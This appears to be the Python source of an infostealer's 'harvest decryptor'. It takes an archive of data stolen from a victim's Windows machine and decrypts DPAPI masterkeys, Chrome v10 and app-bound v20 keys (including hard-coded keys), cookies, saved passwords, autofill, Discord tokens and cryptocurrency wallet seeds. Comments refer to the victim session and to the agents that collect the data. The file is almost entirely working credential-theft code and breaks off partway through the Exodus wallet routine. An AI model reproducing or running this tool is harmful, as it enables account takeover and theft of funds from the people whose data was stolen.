#!/usr/bin/env python3
"""Server Pack Core harvest decryptor.

Point it at a harvest ZIP (or an extracted directory) and it walks everything
that can be recovered offline, in this order:

  dpapi     masterkeys from Protect/<SID>/ + the Windows password (optional)
  browsers  ABE v20 TSV, Local State v10 keys, cookies, logins, history
  discord   discord/token.txt, then encrypted LevelDB blobs
  wallets   Exodus seed, Electrum, Phantom vaults
  accounts  launcher accounts

Usage:
  ./decrypt.py sync-*.zip                    # v20, Discord and ABE need no password
  ./decrypt.py sync-*.zip -p 'Password1'     # legacy user DPAPI blobs
  ./decrypt.py sync-*.zip --list             # inventory only
  ./decrypt.py sync-*.zip --machinekey <40 hex>   # legacy v20 without ABE

Dependencies: cryptography. plyvel only for Phantom, zstandard only for some
Exodus payloads. Everything else is optional; the run tells you what it skipped.
"""

import base64
import getpass
import gzip
import hashlib
import hmac
import json
import os
import re
import shutil
import sqlite3
import struct
import sys
import tempfile
import zipfile
import zlib
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

# --- theme ------------------------------------------------------------------

PLAIN = {"bold": "", "dim": "", "red": "", "green": "", "yellow": "", "blue": "",
         "magenta": "", "cyan": "", "reset": ""}
ANSI = {"bold": "\033[1m", "dim": "\033[2m", "red": "\033[31m", "green": "\033[32m",
        "yellow": "\033[33m", "blue": "\033[34m", "magenta": "\033[35m",
        "cyan": "\033[36m", "reset": "\033[0m"}
T = ANSI
WIDTH = 74

HEADER_SIZE = 224
CHECKSUM_SIZE = 32
METADATA_SIZE = 256
SALT_SIZE, CIPHER_SIZE = 32, 32
BLOB_KEY_IV_SIZE, BLOB_KEY_TAG_SIZE, BLOB_KEY_KEY_SIZE = 12, 16, 32
BLOB_IV_SIZE, BLOB_TAG_SIZE = 12, 16
MAX_OUTPUT_BYTES = 4 * 1024 * 1024


def p(text="", *styles):
    if not styles:
        print(text)
        return
    codes = "".join(T[s] for s in styles if T.get(s))
    print(f"{codes}{text}{T['reset']}" if codes else text)


def title(text):
    p()
    p("─" * WIDTH, "dim")
    p(f"  {text.upper()}", "bold", "magenta")
    p("─" * WIDTH, "dim")


def banner(archive, outdir=None):
    p()
    p("╭" + "─" * (WIDTH - 2) + "╮", "cyan")
    p("│" + " ".ljust(WIDTH - 2) + "│", "cyan")
    line = "  SERVER PACK CORE  ·  HARVEST DECRYPTOR"
    pad = WIDTH - 2 - len(line)
    p("│" + f"{T['bold']}{T['magenta']}{line}{T['reset']}" + " " * pad + "│", "cyan")
    p("│" + " ".ljust(WIDTH - 2) + "│", "cyan")
    p("╰" + "─" * (WIDTH - 2) + "╯", "cyan")
    p(f"  archive  {archive}", "dim")
    if outdir:
        p(f"  output   {outdir}", "dim")
    p()


def ok(text, detail=""):
    p(f"  {T['green']}✓{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def bad(text, detail=""):
    p(f"  {T['red']}✗{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def warn(text, detail=""):
    p(f"  {T['yellow']}!{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def skipped(text, detail=""):
    p(f"  {T['dim']}·{T['reset']} {T['dim']}{text}"
      + (f"  {detail}" if detail else "") + f"{T['reset']}")


def bullet(text, detail=""):
    p(f"  {T['blue']}›{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def step(index, total, text):
    p()
    p(f"  [{index}/{total}] {T['bold']}{text}{T['reset']}")


def mask(value, keep=6):
    value = str(value)
    if len(value) <= keep * 2 + 3:
        return value
    return f"{value[:keep]}…{value[-keep:]}"


def secure(path):
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    return path


def write(outdir, relative, text, mode="w"):
    path = outdir / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(text, bytes):
        with open(path, "wb") as handle:
            handle.write(text)
    else:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
    return secure(path)


def clip(text, limit=58):
    text = " ".join(str(text).split())
    return text if len(text) <= limit else text[: limit - 1] + "…"


# --- crypto primitives ------------------------------------------------------

def cbc_decrypt(key, iv, data):
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return decryptor.update(data) + decryptor.finalize()


def unpad(data):
    if not data:
        return data
    n = data[-1]
    return data[:-n] if 0 < n <= 16 and data[-n:] == bytes([n]) * n else data


ALG = {
    0x660E: (16, "aes", 16),
    0x6610: (32, "aes", 16),
    0x8004: (20, "sha1", 64),
    0x800E: (16, "sha512", 128),
    0x8009: (20, "sha1", 64),
}


def hash_name(alg):
    return ALG[alg][1]


def derive(secret, salt, keylen, count, digest):
    out = b""
    index = 1
    while len(out) < keylen:
        block = hmac.new(secret, salt + struct.pack("!L", index), digest).digest()
        index += 1
        for _ in range(count - 1):
            again = hmac.new(secret, block, digest).digest()
            block = bytes(x ^ y for x, y in zip(block, again))
        out += block
    return out[:keylen]


def _des_parity(key):
    out = bytearray()
    for byte in key:
        bits = f"{byte:08b}"[:7]
        out.append(int(bits + ("1" if bits.count("1") % 2 == 0 else "0"), 2))
    return bytes(out)


class Blob:
    """DPAPI_BLOB as defined by Windows.

    Two layouts exist in the wild: the classic CryptoAPI blob with ANSI
    description and algorithm-id strings, and the CNG blob that Windows 11
    24H2+ writes, where the description is UTF-16 and the alg ids are replaced
    by bit sizes. Both are detected by requiring the parse to end exactly at
    the buffer end.
    """

    def __init__(self, data):
        self.raw = data
        self.guid = data[24:40]
        self.salt = self.hmac_key = self.tag = self.data = b""
        self.crypt_alg = self.hash_alg = 0
        if not (self._classic(data) or self._cng(data)):
            raise ValueError("unparsable DPAPI blob")

    def _classic(self, data):
        try:
            cur = 44
            (desc_len,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4 + desc_len
            (self.crypt_alg,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            self.alg_id = self._take(data, cur)
            cur += 4 + len(self.alg_id)
            if not self._walk(data, cur, alg_strings=True):
                return False
            return True
        except (struct.error, ValueError):
            self.salt = self.hmac_key = self.tag = self.data = b""
            return False

    def _cng(self, data):
        try:
            self._blob_start = 20
            cur = 44
            (desc_len,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4 + desc_len
            (self.crypt_alg,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            (bits,) = struct.unpack("<L", data[cur:cur + 4])
            if bits not in (0x80, 0x100, 0x200, 0x400):
                return False
            cur += 4

            def take():
                nonlocal cur
                value = self._take(data, cur)
                cur += 4 + len(value)
                return value

            def word():
                nonlocal cur
                (value,) = struct.unpack("<L", data[cur:cur + 4])
                cur += 4
                return value

            self.salt = take()
            self.strong = take()
            self.hash_alg = word()
            if self.hash_alg not in ALG:
                return False
            word()                          # hash size in bits
            self.hmac = take()
            self.ciphertext = take()
            self.blob = data[self._blob_start:cur]
            self.sign = take()
            return cur == len(data) and bool(self.salt) and bool(self.ciphertext)
        except (struct.error, ValueError):
            self.salt = self.hmac_key = self.tag = self.data = b""
            return False

    @staticmethod
    def _take(data, cur):
        (size,) = struct.unpack("<L", data[cur:cur + 4])
        value = data[cur + 4:cur + 4 + size]
        if len(value) < size:
            raise ValueError("truncated field")
        return value

    def _walk(self, data, cur, alg_strings):
        def take():
            nonlocal cur
            value = self._take(data, cur)
            cur += 4 + len(value)
            return value

        def word():
            nonlocal cur
            (value,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            return value

        self.salt = take()
        self.strong = take()
        self.hash_alg = word()
        if self.hash_alg not in ALG:
            return False
        word()                          # hash size in bits
        self.hmac = take()
        self.ciphertext = take()
        self.blob = data[getattr(self, "_blob_start", 20):cur]
        self.sign = take() if cur < len(data) else b""
        return cur == len(data) and bool(self.salt) and bool(self.ciphertext)

    def guid_text(self):
        d1, d2, d3 = struct.unpack("<LHH", self.guid[:8])
        tail = self.guid[8:].hex()
        return f"{d1:08x}-{d2:04x}-{d3:04x}-{tail[:4]}-{tail[4:]}"

    def _session(self, key_hash, digest, block, nonce, entropy, verif):
        # Type 1: Microsoft's faulty HMAC (outer pad carries the data).
        padded = key_hash + b"\0" * block
        pad1 = bytes(b ^ 0x36 for b in padded[:block])
        pad2 = bytes(b ^ 0x5C for b in padded[:block])
        outer = hashlib.new(digest, pad2)
        inner = hashlib.new(digest, pad1)
        inner.update(nonce)
        outer.update(inner.digest())
        if entropy:
            outer.update(entropy)
        if verif is not None:
            outer.update(verif)
        return outer.digest()

    def decrypt(self, masterkey, entropy=None):
        digest = hash_name(self.hash_alg)
        block = ALG[self.hash_alg][2]
        key_hash = masterkey if len(masterkey) == 20 else hashlib.sha1(masterkey).digest()
        type2 = hmac.new(key_hash, digestmod=digest)
        type2.update(self.hmac)
        if entropy:
            type2.update(entropy)
        type2.update(self.blob)
        expected = {type2.digest(), self._session(key_hash, digest, block, self.hmac,
                                                  entropy, self.blob)}
        for session in (self._session(key_hash, digest, block, self.salt, entropy, None),
                        hmac.new(key_hash, self.salt + (entropy or b""), digest).digest()):
            material = session
            if len(material) < ALG[self.crypt_alg][0]:
                material += b"\0" * block
                ipad = bytes(b ^ 0x36 for b in material[:block])
                opad = bytes(b ^ 0x5C for b in material[:block])
                material = (hashlib.new(digest, ipad).digest()
                            + hashlib.new(digest, opad).digest())
                material = _des_parity(material)
            plain = cbc_decrypt(material[: ALG[self.crypt_alg][0]],
                                b"\0" * ALG[self.crypt_alg][2], self.ciphertext)
            plain = unpad(plain)
            if not self.sign:
                return plain
            if self.sign in expected:
                return plain
        raise ValueError("DPAPI HMAC mismatch")


def masterkey_decrypt(path, secret):
    """secret is the UTF-16LE password hash for a user key, raw for SYSTEM."""
    data = path.read_bytes()
    (key_len,) = struct.unpack("<Q", data[96:104])
    mk = data[128:128 + key_len]
    salt = mk[4:20]
    (count,) = struct.unpack("<L", mk[20:24])
    (hash_alg,) = struct.unpack("<L", mk[24:28])
    (crypt_alg,) = struct.unpack("<L", mk[28:32])
    cipher = mk[32:]
    digest = hash_name(hash_alg)
    material = derive(secret, salt, ALG[crypt_alg][0] + ALG[crypt_alg][2], count, digest)
    clear = cbc_decrypt(material[: ALG[crypt_alg][0]], material[ALG[crypt_alg][0]:], cipher)
    key = clear[-64:]
    stored = clear[16: 16 + ALG[hash_alg][0]]
    mac_key = hmac.new(secret, clear[:16], digest).digest()
    if hmac.new(mac_key, key, digest).digest()[: ALG[hash_alg][0]] != stored:
        raise ValueError("wrong password")
    return key


# --- inventory --------------------------------------------------------------

class Harvest:
    def __init__(self, root):
        self.root = root
        self.report = {"archive": str(root), "started": None, "sections": {}}
        self.counts = {"cookies": 0, "logins": 0, "tokens": 0, "seeds": 0, "accounts": 0}
        self.skipped = []

    def rel(self, pattern):
        return sorted(p for p in self.root.rglob(pattern) if p.is_file())

    def browser_dirs(self):
        return sorted(p for p in (self.root / "browsers").glob("*") if p.is_dir())

    def note(self, section, key, value):
        self.report["sections"].setdefault(section, {})[key] = value

    def inventory(self):
        keys = {
            "protect blobs": (sum(1 for f in (self.root / "dpapi").rglob("*") if f.is_file())
                              if (self.root / "dpapi").is_dir() else 0),
            "browser profiles": len(self.browser_dirs()),
            "cookie databases": len(self.rel("Cookies")),
            "login databases": len(self.rel("Login_Data")),
            "key files": len(self.rel("keys.txt")),
            "discord dumps": len(self.rel("*.ldb")) + len(self.rel("*.log")),
            "exodus wallet": (self.root / "wallets" / "exodus.wallet").is_dir(),
            "wallet json": len([p for p in self.rel("*.json") if p.parent.name == "wallets"
                                or "wallet" in str(p.parent).lower()]),
            "phantom stores": len(self.rel("Local Extension Settings/*")),
            "accounts": len(self.rel("accounts.json")),
        }
        return keys


def extract(archive):
    if archive.is_dir():
        return archive, None
    workdir = Path(tempfile.mkdtemp(prefix="spc-decrypt-"))
    with zipfile.ZipFile(archive) as zf:
        zf.extractall(workdir)
    return workdir, workdir


def outdir_for(archive, override):
    if override:
        path = Path(override)
    else:
        stem = archive.stem if archive.is_file() else archive.name
        path = Path.cwd() / f"decrypted-{stem}"
    path.mkdir(parents=True, exist_ok=True)
    return path


# --- dpapi section ----------------------------------------------------------

def load_masterkeys(folder, secret, is_system=False):
    """guid -> masterkey for every Protect blob the secret opens."""
    keys = {}
    if folder is None or not folder.is_dir():
        return keys
    if is_system:
        material = secret
    else:
        # Windows DPAPI: SHA1(password UTF-16LE) then a SID-bound HMAC.
        pwd = hashlib.sha1(secret.encode("utf-16le")).digest()
        material = hmac.new(pwd, (folder.name + "\0").encode("utf-16le"), hashlib.sha1).digest()
    for blob_file in sorted(folder.iterdir()):
        if not blob_file.is_file() or blob_file.name == "Preferred":
            continue
        try:
            keys[blob_file.name.lower()] = masterkey_decrypt(blob_file, material)
        except Exception:
            pass
    return keys


def unprotect(blob_bytes, keyring, fallback=True, entropy=None):
    blob = Blob(blob_bytes)
    key = keyring.get(blob.guid_text().lower())
    if key is not None:
        return blob.decrypt(key, entropy)
    if fallback:
        for candidate in keyring.values():
            try:
                return blob.decrypt(candidate, entropy)
            except Exception:
                continue
    raise ValueError("no masterkey for blob")


def decode_wrapped(text):
    """`DPAPI` + base64 (Local State, keys.txt) -> raw DPAPI blob."""
    text = text.strip()
    if text.startswith("DPAPI"):
        text = text[5:]
    raw = base64.b64decode(text)
    return raw[5:] if raw[:5] == b"DPAPI" else raw


def unlock_local_state(keys_file, state_file, keyring):
    """Return the Chromium AES key for a browser, or None."""
    if keys_file and keys_file.is_file():
        for line in keys_file.read_text("utf-8", "replace").splitlines():
            if line.startswith("v10="):
                return bytes.fromhex(line[4:].strip().replace(":", ""))
            if line.startswith("dpapi_key="):
                return unprotect(decode_wrapped(line[10:]), keyring)
    if state_file and state_file.is_file():
        state = json.loads(state_file.read_text("utf-8", "replace"))
        wrapped = state.get("os_crypt", {}).get("encrypted_key")
        if wrapped:
            return unprotect(decode_wrapped(wrapped), keyring)
    return None


APPB_HEADER = b"APPB"
ABE_FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
ABE_FLAG2_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
ABE_FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
ABE_FLAG4_XOR = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
KSP_ENTROPY = b"xT5rZW5qVVbrvpuA\x00"
_KSP_KEY = b""


def set_ksp_key(path):
    """Load Google Chromekey1 and unwrap it with the imported SYSTEM masterkey."""
    global _KSP_KEY
    _KSP_KEY = b""
    if path is None:
        return
    raw = Path(path).read_bytes()
    start = raw.rfind(APP_SIG)
    if start < 0:
        raise ValueError("KSP file has no DPAPI blob")
    plain = unprotect(raw[start:], _SYSTEM_KEYS, fallback=False, entropy=KSP_ENTROPY)
    # BCRYPT_KEY_DATA_BLOB: magic "KDBM" | version | cbKeyData | key
    if len(plain) >= 12 and plain[:4] == b"KDBM":
        size = struct.unpack("<L", plain[8:12])[0]
        _KSP_KEY = plain[12:12 + size]
    else:
        _KSP_KEY = plain[:32]


_SYSTEM_KEYS = {}


def _abe_derive(content):
    """ElevationService ciphertext -> v20 AES key."""
    if len(content) == 32:
        return content
    if not content:
        return b""
    flag = content[0]
    if flag in (1, 2):
        iv, tag, ct = content[1:13], content[13:29], content[29:]
        if flag == 1:
            return AESGCM(ABE_FLAG1_KEY).decrypt(iv, ct + tag, None)
        return ChaCha20Poly1305(ABE_FLAG2_KEY).decrypt(iv, ct + tag, None)
    if flag in (3, 4):
        if not _KSP_KEY:
            raise ValueError(f"flag {flag} needs --ksp (Google Chromekey1)")
        xor = ABE_FLAG3_XOR if flag == 3 else ABE_FLAG4_XOR
        enc_key, iv, ct, tag = content[1:33], content[33:45], content[45:77], content[77:93]
        dec = Cipher(algorithms.AES(_KSP_KEY), modes.CBC(b"\0" * 16)).decryptor()
        key = bytes(x ^ y for x, y in zip(dec.update(enc_key) + dec.finalize(), xor))
        return AESGCM(key).decrypt(iv, ct + tag, None)
    raise ValueError(f"unknown app-bound content flag {flag}")


def unwrap_app_bound(value, system_keys, user_keys):
    """APPB blob1 (SYSTEM) -> blob2 (user) -> ElevationService envelope -> key."""
    raw = decode_wrapped(value)
    if raw[:4] != APPB_HEADER:
        return []
    blob1 = Blob(raw[4:])
    key1 = system_keys.get(blob1.guid_text().lower())
    if key1 is None:
        raise ValueError("no SYSTEM masterkey for blob1")
    plain1 = blob1.decrypt(key1)
    if plain1[:12] == APP_SIG:
        blob2 = Blob(plain1)
        key2 = user_keys.get(blob2.guid_text().lower())
        if key2 is None:
            raise ValueError("no user masterkey for blob2")
        plain2 = blob2.decrypt(key2)
    else:
        plain2 = plain1
    if len(plain2) < 8:
        raise ValueError("truncated app-bound envelope")
    header_len = struct.unpack("<L", plain2[:4])[0]
    at = 4 + header_len
    if at + 4 > len(plain2):
        raise ValueError("truncated app-bound envelope")
    content_len = struct.unpack("<L", plain2[at:at + 4])[0]
    content = plain2[at + 4:at + 4 + content_len]
    key = _abe_derive(content)
    return [key] if key else []


# --- cookies / logins -------------------------------------------------------

def decrypt_chromium(value, key, app_keys=None):
    if not value:
        return ""
    candidates = []
    if value[:3] == b"v10" and key:
        candidates.append(key)
    if value[:3] == b"v20":
        candidates.extend(app_keys or [])
    body = value[3:]
    for candidate in candidates:
        try:
            plain = AESGCM(candidate).decrypt(body[:12], body[12:], None)
            # v20 plaintext carries a 32-byte host hash in front of the value.
            if value[:3] == b"v20" and len(plain) > 32:
                plain = plain[32:]
            return plain.decode("utf-8", "replace")
        except Exception:
            continue
    return None


def open_db(path):
    """Copy the database with its -wal so live writes are visible."""
    temp = Path(tempfile.mkdtemp(prefix="spc-db-")) / path.name
    shutil.copy2(path, temp)
    for suffix in ("-wal", "-shm"):
        side = path.with_name(path.name + suffix)
        if side.exists():
            try:
                shutil.copy2(side, temp.with_name(temp.name + suffix))
            except OSError:
                pass
    return sqlite3.connect(f"file:{temp}?mode=ro", uri=True), temp.parent


def dump_browser(harvest, out, browser, keyring, system_keys, show):
    label = browser.name
    cookies = browser / "Default" / "Network" / "Cookies"
    logins = browser / "Default" / "Login_Data"
    state = browser / "Local State"
    keys_file = browser / "keys.txt"
    browser_keys = []
    if keys_file.is_file():
        lines = keys_file.read_text("utf-8", "replace").splitlines()
        for line in lines:
            # New agents unwrap the app-bound key live, so the AES key is
            # already here and SECURITY.hiv is not needed.
            if line.startswith("v20="):
                try:
                    browser_keys.append(bytes.fromhex(line[4:].strip().replace(":", "")))
                except ValueError:
                    pass
        if not browser_keys:
            for line in lines:
                if line.startswith("app_bound="):
                    try:
                        browser_keys.extend(unwrap_app_bound(line[10:].strip(), system_keys, keyring))
                    except Exception as exc:
                        skipped(f"{label}: app-bound key failed", str(exc))
    abe = browser / "abe"
    if abe.is_dir():
        for source in sorted(abe.glob("*.tsv")):
            text = source.read_text("utf-8", "replace")
            write(out, f"secrets/{label}-abe-{source.name}", text)
            rows = max(0, len(text.splitlines()) - 1)
            if source.name.startswith("cookies"):
                harvest.counts["cookies"] += rows
            elif source.name.startswith("passwords"):
                harvest.counts["logins"] += rows
            ok(f"{label}: ABE {source.stem}", f"{rows} rows")

    try:
        aes = unlock_local_state(keys_file, state, keyring)
    except Exception as exc:
        aes = None
        warn(f"{label}: Local State key failed ({exc})")
    if aes:
        ok(f"{label}: profile AES key recovered")
        write(out, f"secrets/{label}-key.txt", aes.hex() + "\n")
    else:
        skipped(f"{label}: no v10 key")

    if cookies.is_file():
        rows, locked = [], 0
        try:
            conn, tmp = open_db(cookies)
            for host, name, value, enc in conn.execute(
                    "SELECT host_key, name, value, encrypted_value FROM cookies"):
                if not enc:
                    rows.append((host, name, value, "plain"))
                    continue
                plain = decrypt_chromium(enc, aes, browser_keys)
                if plain is None:
                    locked += 1
                else:
                    rows.append((host, name, plain, enc[:3].decode()))
                    harvest.counts["cookies"] += 1
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception as exc:
            warn(f"{label}: cookies unreadable", str(exc))
        if rows:
            write(out, f"secrets/{label}-cookies.tsv",
                  "".join(f"{h}\t{n}\t{v}\t{k}\n" for h, n, v, k in rows))
            ok(f"{label}: {len(rows)} cookies", f"{locked} still locked")
            for host, name, value, _ in rows[:show]:
                bullet(f"{clip(host, 34)}  {clip(name, 20)}", clip(value, 40))
        elif locked:
            warn(f"{label}: {locked} cookies are v20 app-bound")

    if logins.is_file():
        found = []
        try:
            conn, tmp = open_db(logins)
            for origin, user, enc in conn.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"):
                if not enc:
                    continue
                plain = decrypt_chromium(enc, aes, browser_keys)
                if plain is None:
                    continue
                found.append((origin, user, plain))
                harvest.counts["logins"] += 1
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception as exc:
            warn(f"{label}: logins unreadable", str(exc))
        if found:
            write(out, f"secrets/{label}-logins.tsv",
                  "".join(f"{o}\t{u}\t{p}\n" for o, u, p in found))
            ok(f"{label}: {len(found)} saved passwords")
            for origin, user, plain in found[:show]:
                bullet(f"{clip(origin, 40)}  {clip(user, 18)}", clip(plain, 34))

    history = browser / "Default" / "History"
    if history.is_file():
        try:
            conn, tmp = open_db(history)
            rows = conn.execute(
                "SELECT url, title, visit_count FROM urls WHERE url NOT LIKE 'chrome://%' "
                "ORDER BY visit_count DESC LIMIT 40").fetchall()
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
            if rows:
                write(out, f"history/{label}-urls.tsv",
                      "".join(f"{c}\t{u}\t{t}\n" for u, t, c in rows))
                ok(f"{label}: {len(rows)} top URLs")
        except Exception:
            skipped(f"{label}: history unreadable")

    web = browser / "Default" / "Web_Data"
    if web.is_file():
        try:
            conn, tmp = open_db(web)
            rows = conn.execute(
                "SELECT name, value, count FROM autofill WHERE name != '' "
                "ORDER BY count DESC LIMIT 40").fetchall()
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
            if rows:
                write(out, f"secrets/{label}-autofill.tsv",
                      "".join(f"{n}\t{v}\t{c}\n" for n, v, c in rows))
                ok(f"{label}: {len(rows)} autofill rows")
        except Exception:
            pass


# --- discord ----------------------------------------------------------------

APP_TOKEN = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
APP_SIG = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11"


def discord_aes_keys(harvest, keyring):
    """v10 Discord tokens use the DPAPI-wrapped key in the sibling Local State."""
    keys = []
    for state in harvest.rel("Local State"):
        parts = [part.lower() for part in state.parts]
        if "discord" not in parts and "discordcanary" not in parts and "discordptb" not in parts:
            continue
        try:
            key = unlock_local_state(None, state, keyring)
        except Exception:
            key = None
        if key:
            keys.append(key)
    return keys


def find_tokens(harvest, keyring):
    found = []
    aes_keys = discord_aes_keys(harvest, keyring)
    for dump in harvest.rel("*.ldb") + harvest.rel("*.log"):
        try:
            data = dump.read_bytes()
        except OSError:
            continue
        for match in APP_TOKEN.finditer(data):
            try:
                blob = base64.b64decode(match.group(1))
            except Exception:
                continue
            plain = b""
            index = blob.find(APP_SIG)
            if index >= 0:
                try:
                    plain = unprotect(blob[index:], keyring)
                except Exception:
                    plain = b""
            elif blob[:3] == b"v10":
                for key in aes_keys:
                    try:
                        plain = AESGCM(key).decrypt(blob[3:15], blob[15:], None)
                        break
                    except Exception:
                        continue
            if not plain:
                continue
            for token in re.findall(
                    rb"(?:mfa\.[\w-]{20,}|[A-Za-z\d]{20,}\.[\w-]{6,}\.[\w-]{25,}"
                    rb"|[A-Za-z\d]{20,}\.[\w-]{20,})", plain):
                found.append(token.decode())
    return list(dict.fromkeys(found))


# --- wallets ----------------------------------------------------------------

def read_seco(path):
    data = path.read_bytes()
    if data[:4] != b"SECO":
        raise ValueError("not a SECO container")
    off = HEADER_SIZE + CHECKSUM_SIZE
    meta = data[off:off + METADATA_SIZE]
    off += METADATA_SIZE
    if len(meta) < METADATA_SIZE:
        raise ValueError("truncated metadata")
    if meta[SALT_SIZE + 12: SALT_SIZE + 12 + CIPHER_SIZE].rstrip(b"\0") != b"aes-256-gcm":
        raise ValueError("unsupported cipher")
    n, r, prm = struct.unpack(">LLL", meta[SALT_SIZE:SALT_SIZE + 12])
    cur = SALT_SIZE + 12 + CIPHER_SIZE
    key_iv = meta[cur:cur + BLOB_KEY_IV_SIZE]
    key_tag = meta[cur + BLOB_KEY_IV_SIZE: cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE]
    wrapped = meta[cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE:
                   cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE + BLOB_KEY_KEY_SIZE]
    cur += BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE + BLOB_KEY_KEY_SIZE
    blob_iv = meta[cur:cur + BLOB_IV_SIZE]
    blob_tag = meta[cur + BLOB_IV_SIZE: cur + BLOB_IV_SIZE + BLOB_TAG_SIZE]
    (size,) = struct.unpack(">L", data[off:off + 4])
    blob = data[off + 4:off + 4 + size]
    return dict(salt=meta[:SALT_SIZE], n=n, r=r, p=prm, key_iv=key_iv, key_tag=key_tag,
                wrapped=wrapped, blob_iv=blob_iv, blob_tag=blob_tag, blob=blob)


def open_seco(container, passphrase):
    kek = hashlib.scrypt(passphrase, salt=container["salt"], n=container["n"],
                         r=container["r"], p=container["p"], dklen=32,
                         maxmem=256 * container["n"] * container["r"] + (1 << 22))
    data_key = AESGCM(kek).decrypt(container["key_iv"],
                                   container["wrapped"] + container["key_tag"], None)
    return AESGCM(data_key).decrypt(container["blob_iv"],
                                    container["blob"] + container["blob_tag"], None)


def bitcoin_seed_words(data):
    """`bitcoin-seed` serialize(): 64-byte BIP39 seed || 16/32-byte entropy."""
    if not data or len(data) < 80:
        return None
    seed, entropy = data[:64], data[64:]
    if len(entropy) not in (16, 32):
        return None
    try:
        vocab = (Path(__file__).parent / "bip39.txt").read_text().split()
        digest = hashlib.sha256(entropy).digest()
        bits = "".join(f"{byte:08b}" for byte in entropy)
        bits += "".join(f"{byte:08b}" for byte in digest)[: len(entropy) * 8 // 32]
        words = [vocab[int(bits[i:i + 11], 2)] for i in range(0, len(bits), 11)]
        mnemonic = " ".join(words)
        check = hashlib.pbkdf2_hmac("sha512", mnemonic.encode(), b"mnemonic", 2048)
        return words if check == seed else None
    except (OSError, IndexError, ValueError):
        return None


def exodus_payload_words(data):
    """Mnemonic from an opened Exodus payload (current or legacy layout)."""
    words = bitcoin_seed_words(data)
    if words:
        return words
    if not data:
        return None
    # Legacy serializeOld(): 64-byte seed || ASCII mnemonic.
    candidates = (data[64:], data)
    for raw in candidates:
        try:
            text = raw.decode("ascii").strip()
        except UnicodeDecodeError:
            continue
        words = text.split()
        if 12 <= len(words) <= 24 and bip39_ok(words):
            return words
    return None


def bip39_ok(words):
    try:
        vocab = (Path(__file__).parent / "bip39.txt").read_text().split()
        index = {word: i for i, word in enumerate(vocab)}
        bits = "".join(f"{index[word]:011b}" for word in words)
        checksum = len(bits) % 32
        entropy_bits = bits[:-checksum]
        entropy = int(entropy_bits, 2).to_bytes(len(entropy_bits) // 8, "big")
        expected = "".join(f"{byte:08b}" for byte in hashlib.sha256(entropy).digest())[:checksum]
        return bits[-checksum:] == expected
    except (OSError, KeyError, ValueError):
        return False


def decode_payload(data):
    """Unwrap the Exodus 4-byte length + gzip record, then best-effort text."""
    if len(data) > 6:
        (size,) = struct.unpack(">L", data[:4])
        if 0 < size <= len(data) - 4 and data[4:6] == b"\x1f\x8b":
            try:
                inner = zlib.decompressobj(31).decompress(data[4:4 + size])
                if inner:
                    return "bitcoin-seed", inner
            except zlib.error:
                pass
    pos = data.find(b"\x1f\x8b")
    while 0 <= pos < 512:
        try:
            return "gzip", zlib.decompressobj(31).decompress(data[pos:])
        except zlib.error:
            pos = data.find(b"\x1f\x8b", pos + 1)
    if data[:4] == b"\x28\xb5\x2f\xfd":
        try:
            import zstandard
            return "zstd", zstandard.ZstdDecompressor().decompress(data)
        except Exception:
            pass
    for marker in (b'{"', b'{"version', b"{", b"["):
        index = data.find(marker)
        if 0 <= index < 256:
            try:
                return f"json+{index}", data[index:]
            except Exception:
                pass
    return None, data


def bip39_scan(data):
    """Longest run of consecutive BIP39 words in printable stretches."""
    try:
        vocab = set((Path(__file__).parent / "bip39.txt").read_text().split())
    except OSError:
        return None
    if not vocab:
        return None
    for run in re.finditer(rb"[a-z ]{48,}", data):
        words = run.group().decode().split()
        index = 0
        while index < len(words):
            if words[index] not in vocab:
                index += 1
                continue
            end = index
            while end < len(words) and words[end] in vocab:
                end += 1
            count = end - index
            size = 24 if count >= 24 else count - count % 3
            if size >= 12:
                return words[index:index + size]
            index = end + 1
    return None


def dump_exodus(harvest, out, keyring, system_keys, show):
    wallet = harvest.root / "wallets" / "exodus.wallet"
    passphrase_json = wallet / "passphrase.json"
    seed = wallet / "seed.seco"
    if not seed.is_file():
        skipped("exodus: no seed.seco")
        return
    secret = None
    live = harvest.root / "wallets" / "exodus-passphrase.txt"
    if live.is_file():
        # The agent already called CryptUnprotectData in the victim session.
        for line in live.read_text("utf-8", "replace").splitlines():
            if not line.startswith("passphrase="):
                continue
            try:
                candidate = base64.b64decode(line[11:].strip())
                open_seco(read_seco(seed), candidate)
                secret = candidate
                break
            except Exception:
                continue
    if secret is None and passphrase_json.is_file():
        meta = json.loads(passphrase_json.read_text("utf-8", "replace"))
